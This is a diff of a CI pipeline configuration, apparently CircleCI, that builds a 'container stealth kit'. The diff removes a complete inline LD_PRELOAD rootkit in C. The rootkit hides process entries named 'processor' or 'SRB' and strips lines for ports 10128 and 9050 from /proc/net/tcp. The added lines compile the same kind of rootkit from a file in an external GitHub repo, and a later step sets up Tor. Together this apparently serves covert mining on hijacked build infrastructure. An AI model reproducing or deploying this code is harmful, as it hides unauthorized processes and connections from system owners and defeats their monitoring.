@@ -36,64 +36,38 @@ jobs:
             echo "Building container stealth kit..."
             echo "==================================="
             
-            # Create minimal LD_PRELOAD rootkit
-            cat > /tmp/rootkit_container.c <<'RKCODE'
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <dlfcn.h>
-#include <dirent.h>
-
-static struct dirent *(*orig_readdir)(DIR *) = NULL;
-static FILE *(*orig_fopen)(const char *, const char *) = NULL;
-
-static void init(void) {
-    if (!orig_readdir) {
-        orig_readdir = dlsym(RTLD_NEXT, "readdir");
-        orig_fopen = dlsym(RTLD_NEXT, "fopen");
-    }
-}
-
-struct dirent *readdir(DIR *dirp) {
-    init();
-    struct dirent *e;
-    while ((e = orig_readdir(dirp))) {
-        if (strstr(e->d_name, "processor") || strstr(e->d_name, "SRB")) continue;
-        break;
-    }
-    return e;
-}
-
-FILE *fopen(const char *path, const char *mode) {
-    init();
-    FILE *f = orig_fopen(path, mode);
-    if (!f || !path) return f;
-    if (strstr(path, "/proc/net/tcp")) {
-        FILE *t = tmpfile();
-        if (!t) return f;
-        char l[1024];
-        while (fgets(l, sizeof(l), f)) {
-            if (!strstr(l, "10128") && !strstr(l, "9050")) fputs(l, t);
-        }
-        fclose(f);
-        rewind(t);
-        return t;
-    }
-    return f;
-}
-
-__attribute__((constructor)) static void load(void) { init(); }
-RKCODE
-
-            # Compile
-            gcc -shared -fPIC -o /tmp/libhide.so /tmp/rootkit_container.c -ldl 2>/dev/null
-            
-            if [ -f /tmp/libhide.so ]; then
-              echo "✅ Container rootkit built"
-            else
-              echo "⚠️ Rootkit build failed (will continue)"
+            # Check if rootkit was downloaded from GitHub
+            if [ ! -f /tmp/rootkit/container_rootkit.c ]; then
+              echo "❌ ERROR: container_rootkit.c not found in GitHub repo"
+              echo ""
+              echo "Required file missing from:"
+              echo "https://github.com/temporaxinfinity-pixel/singular"
+              echo ""
+              echo "Please add container_rootkit.c to the root of the repo"
+              exit 1
             fi
+            
+            echo "✅ Found container_rootkit.c from GitHub"
+            
+            # Compile from GitHub repo
+            cd /tmp/rootkit
+            gcc -shared -fPIC -o /tmp/libhide.so container_rootkit.c -ldl 2>&1
+            
+            if [ ! -f /tmp/libhide.so ]; then
+              echo "⚠️ First compilation failed, retrying with warnings suppressed..."
+              gcc -shared -fPIC -o /tmp/libhide.so container_rootkit.c -ldl -w 2>&1
+            fi
+            
+            # Verify compilation succeeded
+            if [ ! -f /tmp/libhide.so ]; then
+              echo "❌ ERROR: Failed to compile rootkit"
+              echo "Check container_rootkit.c for syntax errors"
+              exit 1
+            fi
+            
+            echo "✅ Container rootkit compiled successfully"
+            ls -lh /tmp/libhide.so
+            file /tmp/libhide.so
       
       - run:
           name: "Setup Cloudflare + Tor Hybrid"
